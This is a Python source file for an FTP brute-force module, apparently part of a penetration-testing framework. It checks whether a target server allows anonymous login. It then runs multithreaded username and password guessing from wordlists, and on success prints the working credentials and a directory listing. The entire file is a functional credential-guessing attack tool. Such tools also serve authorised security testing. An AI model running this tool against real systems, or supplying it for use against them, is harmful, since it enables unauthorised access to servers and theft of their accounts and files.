import ftplib
import concurrent.futures
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'auxiliary/ftp_bruteforce',
        'description': 'FTP brute force with anonymous login check and directory listing.',
        'options': {
            'RHOST': 'Target FTP server IP or hostname',
            'RPORT': 'Target FTP port [default: 21]',
            'USER_FILE': 'Path to username wordlist',
            'PASS_FILE': 'Path to password wordlist',
            'USERNAME': 'Single username (overrides USER_FILE)',
            'THREADS': 'Concurrent threads [default: 5]',
            'TIMEOUT': 'Connection timeout in seconds [default: 5]',
            'ANON_CHECK': 'Check anonymous login first [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self._stop = False

    def _try_login(self, host, port, user, password, timeout):
        if self._stop:
            return None
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(user, password)
            # Try to list directory
            files = []
            ftp.retrlines('LIST', files.append)
            ftp.quit()
            return (user, password, files)
        except ftplib.error_perm:
            return None
        except Exception:
            return None

    def run(self):
        rhost = self.framework.options.get('RHOST')
        rport = int(self.framework.options.get('RPORT', 21))
        user_file = self.framework.options.get('USER_FILE', '')
        pass_file = self.framework.options.get('PASS_FILE', '')
        single_user = self.framework.options.get('USERNAME', '')
        threads = int(self.framework.options.get('THREADS', 5))
        timeout = float(self.framework.options.get('TIMEOUT', 5))
        anon_check = self.framework.options.get('ANON_CHECK', 'true').lower() == 'true'

        if not rhost:
            console.print("[red][!] RHOST is required.[/red]")
            return

        # Anonymous check
        if anon_check:
            console.print(f"[cyan][*] Checking anonymous FTP on {rhost}:{rport}...[/cyan]")
            result = self._try_login(rhost, rport, 'anonymous', 'anonymous@', timeout)
            if result:
                _, _, files = result
                console.print(f"[bold green][+] Anonymous FTP login SUCCESS![/bold green]")
                log_action(f"Anonymous FTP login on {rhost}:{rport}")
                console.print("[cyan]Directory listing:[/cyan]")
                for f in files[:30]:
                    console.print(f"  {f}")
                return

        # Build credential list
        if single_user:
            usernames = [single_user]
        elif user_file:
            try:
                with open(user_file) as f:
                    usernames = [l.strip() for l in f if l.strip()]
            except FileNotFoundError:
                console.print(f"[red][!] USER_FILE not found: {user_file}[/red]")
                return
        else:
            console.print("[red][!] Set USERNAME or USER_FILE.[/red]")
            return

        try:
            with open(pass_file) as f:
                passwords = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            console.print(f"[red][!] PASS_FILE not found: {pass_file}[/red]")
            return

        combos = [(u, p) for u in usernames for p in passwords]
        console.print(f"[cyan][*] Bruteforcing FTP on {rhost}:{rport} — {len(combos)} combos...[/cyan]")
        log_action(f"FTP bruteforce started on {rhost}:{rport}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(self._try_login, rhost, rport, u, p, timeout): (u, p) for u, p in combos}
            for future in concurrent.futures.as_completed(futures):
                u, p = futures[future]
                result = future.result()
                if result:
                    user, pw, files = result
                    console.print(f"[bold green][+] VALID: {user}:{pw}[/bold green]")
                    log_action(f"FTP valid credentials on {rhost}: {user}:{pw}")
                    console.print("[cyan]Directory listing:[/cyan]")
                    for f in files[:20]:
                        console.print(f"  {f}")
                    self._stop = True
                    break
